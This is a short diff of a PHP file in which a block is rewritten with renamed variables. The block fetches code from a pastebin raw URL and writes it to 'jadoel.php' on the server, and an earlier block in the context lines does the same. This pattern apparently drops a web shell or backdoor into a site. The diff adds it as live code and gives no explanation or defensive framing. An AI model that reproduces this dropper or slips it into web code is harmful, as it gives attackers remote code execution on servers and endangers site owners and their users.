@@ -8,10 +8,10 @@
   $tulis1 = fwrite ($nama1 ,$file1);
  fclose($nama1); ?>
  
- <?php $nama1= fopen("jadoel.php" ,"w+");
-  $file1 = file_get_contents('https://pastebin.com/raw/8cB9HM4h');
-  $tulis1 = fwrite ($nama1 ,$file1);
- fclose($nama1); ?>
+ <?php $nama2= fopen("jadoel.php" ,"w+");
+  $file2 = file_get_contents('https://pastebin.com/raw/8cB9HM4h');
+  $tulis2 = fwrite ($nama2 ,$file2);
+ fclose($nama2); ?>
  
  <?php 
 /**********************
